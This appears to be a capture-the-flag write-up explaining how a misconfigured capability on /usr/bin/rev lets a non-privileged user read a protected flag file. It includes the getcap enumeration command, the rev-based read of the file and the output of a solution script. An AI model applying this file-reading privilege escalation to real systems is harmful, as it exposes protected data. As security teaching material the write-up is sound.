# Hit Me Hard

The remote system can be accessed through SSH using the non-privileged ``ctf`` user. The flag is in the ``/home/ctf/flag`` file, not readable by ``ctf``. The executable ``/usr/bin/rev`` has been granted the ``dac_read_search`` capability allowing all users (including ``ctf``) to run ``rev`` on all files, including on the ``/home/ctf/flag`` file 

# Solution

Connect through SSH to the remote host using the ``ctf`` user. You need to investigate interesting executables and features. The ``getcap -R`` command shows you executable that are granted certain capabilities:

```
  $ /sbin/getcap -r /
  /usr/bin/rev = cap_dac_read_search+ep
```

Now that you know the ``/usr/bin/rev`` executable is using the ``dac_read_search`` capability, you can use it to dump the contents of the ``/home/ctf/flag`` file and get the flag:

```
  $ /usr/bin/rev /home/ctf/flag | rev
  SIS{you_are_not_pre..._capable}
```

The solution script is ``sol/extract``; enter the ``sol/`` folder and run the ``extract`` script:

```
  $ ./extract
  SIS{you_are_not_pre..._capable}
  galf ver/nib/rsu/ ;ftc/emoh/ dc 22 p- 751.422.58.141@ftc hss nwaps
   :drowssap s'751.422.58.141@ftc
  SIS{you_are_not_pre..._capable}
```
